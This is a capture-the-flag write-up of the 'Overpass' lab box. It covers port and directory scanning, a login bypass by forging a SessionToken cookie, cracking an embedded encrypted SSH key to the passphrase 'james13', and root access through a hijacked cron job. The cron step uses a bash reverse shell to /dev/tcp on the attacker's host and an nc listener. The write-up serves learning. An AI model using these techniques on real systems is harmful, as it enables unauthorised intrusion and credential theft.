#CTF 

## Recon

Beginning with [[Nmap]] we have 
```
Starting Nmap 7.60 ( https://nmap.org ) at 2023-05-26 21:30 BST
Nmap scan report for ip-10-10-79-144.eu-west-1.compute.internal (10.10.79.144)
Host is up (0.0011s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (EdDSA)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
MAC Address: 02:89:64:FE:4A:C3 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.53 seconds

```

And also [[Gobuster]] 

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.79.144
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/05/26 21:31:18 Starting gobuster
===============================================================
/aboutus (Status: 301)
/admin (Status: 301)
/css (Status: 301)
/downloads (Status: 301)
/img (Status: 301)
/index.html (Status: 301)
===============================================================
2023/05/26 21:31:18 Finished
===============================================================

And also with /usr/share/wordlists/dirbuster/directory-list-1.0.txt

/**http%3A%2F%2Fwww (Status: 301)
/**http%3A%2F%2Fad (Status: 301)
```

-  Aboutus
	Has some text and staff.
-  Admin
	Has a user pass form
-  Css
	Has 2 css files, login.css and main.css
-  Downloads
	Precompiled binaries of Overpass
	    Windows x86-64
	    Linux x86-64
	    MacOS x86-64
	    FreeBSD x86-64
	    OpenBSD x86-64
	Have Golang installed? Need a binary for 32bit systems? Want to build your own binary to make sure it's safe? Grab the source code here
	    Source Code
	    Build Script
-  Img
	Has three images

## Next steps

I navigated to the /downloads page and Downloaded  Source Code and Build Script
```
overpass.go: C source, ASCII text, with CRLF line terminators]
buildscript.sh: ASCII text
```


Also downloaded Linux x86-64
```
overpassLinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
```
It is an executable so I give it `chmod +x` and run it.
And returns
```
open /root/.overpass: no such file or directory
Failed to open or read file
Continuing with new password file.
Welcome to Overpass
Options:
1	Retrieve Password For Service
2	Set or Update Password For Service
3	Delete Password For Service
4	Retrieve All Passwords
5	Exit
Choose an option:	
```


Nothing here. I get help online and I go to /admin.
I open console and navigate to network. There is a login.js that gets called. There is a interesting main function

```
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

Here else suggests that id the statusOrCookie has any value then we get in.
So I F12 and go to Storage. I create a new cookie , name it `SessionToken` and with Path `/`
I refresh the tab and get in! I am pressented with this:

```
Since you keep forgetting your password, James, I've set up SSH keys for you.

If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
Also, we really need to talk about this "Military Grade" encryption. - Paradox

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----


```

I download [[John The Ripper#Identifying Hashes]] but couldn't solve it.
So I searched on the internet how to crack RSA private keys and I found that I need to turn them first in john-readable form with ssh2john.py. So I did it with:
`python3 /opt/john/ssh2john.py id_rsa > id_rsa.hash`
And then I run john with id_rsa.hash and got the password.
So we have a username probably <font color="#FFFF00" > James or james </font> and a password <font color="#FFFF00" > james13 </font>
So lets try to connect!


## Attack

I will try to connect in the ssh service with the creds we found above.
Did a little search on the internet. First I have to add some permissions to the id_rsa file:
`chmod 600 id_rsa` , and after that we can login like so:
`ssh -i id_rsa james@[ip]` and giving the password.

Inside I find two files.
- user.txt
	Its my first flag.

- todo.txt
```
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```


Doing `ls -la` and I find a .overpass file. Cating that and I get
`,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.`
Using an online decryptor of Rot47 and I get
`[{"name":"System","pass":"saydrawnlyingpicture"}]`

From [[Privilate Escalation#Linux#Privilege Escalation Cron Jobs]]
I cat `/ect/crontab` and I find
`* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash `

Lets see the /etc/hosts
```
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

I need to change the overpass.thm to my ip. 
On my local machine I make the path for the script.
So `mkdir /downloads/scr` and inside I make `buildscript.sh`
I nano it and I type
`bash -c "bash -i >& /dev/tcp/[my ip]/1337 0>&1"`

I opened a connection with
`nc -lnvp 1337`
and in another console I make a server
`python3 -m http.server 80`

These connected and I found my flag